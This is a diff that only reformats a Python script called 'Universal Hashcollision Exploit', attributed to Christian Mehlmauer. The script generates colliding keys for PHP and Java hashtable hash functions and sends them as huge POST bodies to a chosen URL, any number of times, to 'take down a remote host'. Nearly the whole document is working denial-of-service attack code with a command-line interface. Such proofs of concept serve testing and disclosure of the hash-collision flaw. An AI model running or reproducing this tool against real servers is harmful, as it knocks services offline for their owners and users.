@@ -1,5 +1,4 @@
 #! /usr/bin/env python
-
 """
 This script was written by Christian Mehlmauer <FireFart@gmail.com>
 https://twitter.com/#!/_FireFart_
@@ -54,41 +53,41 @@ class Payloadgenerator:
     # Maximum recursions when searching for collisionchars
     _recursivemax = 15
     _recursivecounter = 1
-    
-    def __init__(self, verbose, collisionchars = 5, collisioncharlength = 2, payloadlength = 8):
+
+    def __init__(self, verbose, collisionchars=5, collisioncharlength=2, payloadlength=8):
         self._verbose = verbose
         self._collisionchars = collisionchars
         self._collisioncharlength = collisioncharlength
         self._payloadlength = payloadlength
-    
+
     def generateASPPayload(self):
         raise Exception("ASP Payload not implemented")
-    
+
     def generateJAVAPayload(self):
         a = self._computeJAVACollisionChars(self._collisionchars)
         return self._generatePayload(a, self._payloadlength)
-    
+
     def generatePHPPayload(self):
         # Note: Default max POST Data Length in PHP is 8388608 bytes (8MB)
-        # compute entries with collisions in PHP hashtable hash function 
+        # compute entries with collisions in PHP hashtable hash function
         a = self._computePHPCollisionChars(self._collisionchars)
-        return self._generatePayload(a, self._payloadlength);
-    
+        return self._generatePayload(a, self._payloadlength)
+
     def _computePHPCollisionChars(self, count):
         charrange = range(0, 256)
         return self._computeCollisionChars(self._DJBX33A, count, charrange)
-    
+
     def _computeJAVACollisionChars(self, count):
         charrange = range(0, 129)
         return self._computeCollisionChars(self._DJBX31A, count, charrange)
-    
+
     def _computeCollisionChars(self, function, count, charrange):
         hashes = {}
         counter = 0
         length = self._collisioncharlength
         a = ""
         for i in charrange:
-            a = a+chr(i)
+            a = a + chr(i)
         source = list(itertools.product(a, repeat=length))
         basestr = ''.join(random.choice(source))
         basehash = function(basestr)
@@ -98,11 +97,11 @@ class Payloadgenerator:
             tempstr = ''.join(item)
             if tempstr == basestr:
                 continue
-            if function(tempstr)  == basehash:
+            if function(tempstr) == basehash:
                 hashes[str(counter)] = tempstr
                 counter = counter + 1
             if counter >= count:
-                break;
+                break
         if counter < count:
             # Try it again
             if self._recursivecounter > self._recursivemax:
@@ -120,7 +119,7 @@ class Payloadgenerator:
                     for i in tempstr:
                         print("\t\tValue: %s\tCharcode: %d" % (i, ord(i)))
         return hashes
-    
+
     def _DJBXA(self, inputstring, base, start):
         counter = len(inputstring) - 1
         result = start
@@ -128,15 +127,15 @@ class Payloadgenerator:
             result = result + (math.pow(base, counter) * ord(item))
             counter = counter - 1
         return int(round(result))
-    
+
     #PHP
     def _DJBX33A(self, inputstring):
         return self._DJBXA(inputstring, 33, 5381)
-    
+
     #Java
     def _DJBX31A(self, inputstring):
         return self._DJBXA(inputstring, 31, 0)
-    
+
     #ASP
     def _DJBX33X(self, inputstring):
         counter = len(inputstring) - 1
@@ -145,26 +144,26 @@ class Payloadgenerator:
             result = result + (int(round(math.pow(33, counter))) ^ ord(item))
             counter = counter - 1
         return int(round(result))
-    
+
     def _generatePayload(self, collisionchars, payloadlength):
         # Taken from:
         # https://github.com/koto/blog-kotowicz-net-examples/tree/master/hashcollision
-    
+
         # how long should the payload be
         length = payloadlength
         size = len(collisionchars)
         post = ""
-        maxvaluefloat = math.pow(size,length)
+        maxvaluefloat = math.pow(size, length)
         maxvalueint = int(math.floor(maxvaluefloat))
-        for i in range (maxvalueint):
+        for i in range(maxvalueint):
             inputstring = self._base_convert(i, size)
             result = inputstring.rjust(length, "0")
             for item in collisionchars:
                 result = result.replace(str(item), collisionchars[item])
-            post += urllib.urlencode({result:""}) + "&"
-    
-        return post;
-    
+            post += urllib.urlencode({result: ""}) + "&"
+
+        return post
+
     def _base_convert(self, num, base):
         fullalphabet = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
         alphabet = fullalphabet[:base]
@@ -179,22 +178,36 @@ class Payloadgenerator:
         arr.reverse()
         return "".join(arr)
 
+
 def main():
-    parser = argparse.ArgumentParser(description="Take down a remote Host via Hashcollisions", prog="Universal Hashcollision Exploit")
+    parser = argparse.ArgumentParser(
+        description="Take down a remote Host via Hashcollisions", prog="Universal Hashcollision Exploit")
     parser.add_argument("-u", "--url", dest="url", help="Url to attack", required=True)
     parser.add_argument("-w", "--wait", dest="wait", action="store_true", default=False, help="wait for Response")
     parser.add_argument("-c", "--count", dest="count", type=int, default=1, help="How many requests")
     parser.add_argument("-v", "--verbose", dest="verbose", action="store_true", default=False, help="Verbose output")
     parser.add_argument("-s", "--save", dest="save", help="Save payload to file")
     parser.add_argument("-p", "--payload", dest="payload", help="Save payload to file")
-    parser.add_argument("-o", "--output", dest="output", help="Save Server response to file. This name is only a pattern. HTML Extension will be appended. Implies -w")
-    parser.add_argument("-t", "--target", dest="target", help="Target of the attack", choices=["ASP", "PHP", "JAVA"], required=True)
-    parser.add_argument("-m", "--max-payload-size", dest="maxpayloadsize", help="Maximum size of the Payload in Megabyte. PHPs defaultconfiguration does not allow more than 8MB, Tomcat is 2MB", type=int)
-    parser.add_argument("-g", "--generate", dest="generate", help="Only generate Payload and exit", default=False, action="store_true")
+    parser.add_argument(
+        "-o",
+        "--output",
+        dest="output",
+        help="Save Server response to file. This name is only a pattern. HTML Extension will be appended. Implies -w")
+    parser.add_argument(
+        "-t", "--target", dest="target", help="Target of the attack", choices=["ASP", "PHP", "JAVA"], required=True)
+    parser.add_argument(
+        "-m",
+        "--max-payload-size",
+        dest="maxpayloadsize",
+        help=
+        "Maximum size of the Payload in Megabyte. PHPs defaultconfiguration does not allow more than 8MB, Tomcat is 2MB",
+        type=int)
+    parser.add_argument(
+        "-g", "--generate", dest="generate", help="Only generate Payload and exit", default=False, action="store_true")
     parser.add_argument("--version", action="version", version="%(prog)s 6.0")
 
     options = parser.parse_args()
-    
+
     if options.target == "PHP":
         if not options.maxpayloadsize or options.maxpayloadsize == 0:
             maxpayloadsize = 8
@@ -236,7 +249,7 @@ def main():
 
     if not options.payload:
         print("Generating Payload...")
-        
+
         # Number of colliding chars to find
         collisionchars = 5
         # Length of the collision chars (2 = Ey, FZ; 3=HyA, ...)
@@ -261,15 +274,15 @@ def main():
         f = open(options.payload, "r")
         payload = f.read()
         f.close()
-        print("Loaded Payload from %s" % options.payload)    
+        print("Loaded Payload from %s" % options.payload)
 
     # trim to maximum payload size (in MB)
-    maxinmb = maxpayloadsize*1024*1024
+    maxinmb = maxpayloadsize * 1024 * 1024
     payload = payload[:maxinmb]
     # remove last invalid(cut off) parameter
     position = payload.rfind("=&")
-    payload = payload[:position+1]
-    
+    payload = payload[:position + 1]
+
     # Save payload
     if options.save:
         f = open(options.save, "w")
@@ -288,7 +301,7 @@ def main():
     print
 
     for i in range(options.count):
-        print("sending Request #%s..." % str(i+1))
+        print("sending Request #%s..." % str(i + 1))
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         if url.scheme == "https":
             ssl_sock = ssl.wrap_socket(sock)
@@ -315,7 +328,7 @@ Content-Length: %s\r\n\
 
         if options.verbose:
             if len(request) > 400:
-                print(request[:400]+"....")
+                print(request[:400] + "....")
             else:
                 print(request)
             print("")
@@ -333,10 +346,10 @@ Content-Length: %s\r\n\
                 while len(data):
                     string = string + data
                     data = sock.recv(1024)
-            
+
             elapsed = (time.time() - start)
-            print("Request %s finished" % str(i+1))
-            print("Request %s duration: %s" % (str(i+1), elapsed))
+            print("Request %s finished" % str(i + 1))
+            print("Request %s duration: %s" % (str(i + 1), elapsed))
             split = string.partition("\r\n\r\n")
             header = split[0]
             content = split[2]
@@ -346,8 +359,8 @@ Content-Length: %s\r\n\
                 print(header)
                 print("")
             if options.output:
-                f = open(options.output+str(i)+".html", "w")
-                f.write("<!-- "+header+" -->\r\n"+content)
+                f = open(options.output + str(i) + ".html", "w")
+                f.write("<!-- " + header + " -->\r\n" + content)
                 f.close()
 
         if url.scheme == "https":
@@ -355,6 +368,7 @@ Content-Length: %s\r\n\
             sock.close()
         else:
             sock.close()
+
 
 if __name__ == "__main__":
     main()
